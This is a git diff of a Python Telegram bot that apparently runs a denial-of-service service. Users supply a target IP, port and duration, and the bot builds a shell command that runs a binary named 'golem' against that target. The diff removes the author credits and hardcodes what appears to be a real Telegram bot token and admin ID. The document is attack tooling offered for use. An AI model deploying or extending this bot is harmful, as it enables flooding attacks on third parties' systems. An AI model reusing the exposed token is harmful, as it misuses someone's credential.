@@ -1,8 +1,4 @@
-#SCRIPT BY 
-#@NINJAGAMEROP
-#@Legacy4real0
-#@God_x_Sikandar
-#@Mr_sid_001
+
 import os
 import time
 import json
@@ -22,10 +18,10 @@ from typing import Optional
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('BOT_TOKEN')
+bot = telebot.TeleBot('7748815259:AAFRIb0C_PJMkVIaVqcosrnNIr0Fg_PU5Go')
 
 # Insert your admin id here
-admin_id = ["ADMIN_ID"]
+admin_id = ["7584228621"]
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -400,11 +396,11 @@ def process_attack_details(message):
         # Set up attack command
         log_command(user_id, target, port, time_duration)
         if full_command_type == 1:
-            full_command = f"./{binary_name} {target} {port} {time_duration}"
+            full_command = f"./golem {target} {port} {time_duration}"
         elif full_command_type == 2:
-            full_command = f"./{binary_name} {target} {port} {time_duration} {threads}"
+            full_command = f"./golem {target} {port} {time_duration} {threads}"
         elif full_command_type == 3:
-            full_command = f"./{binary_name} {target} {port} {time_duration} {packets} {threads}"
+            full_command = f"./golem {target} {port} {time_duration} {packets} {threads}"
         else:
             bot.reply_to(message, "⛔️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘁𝘆𝗽𝗲!")
             return
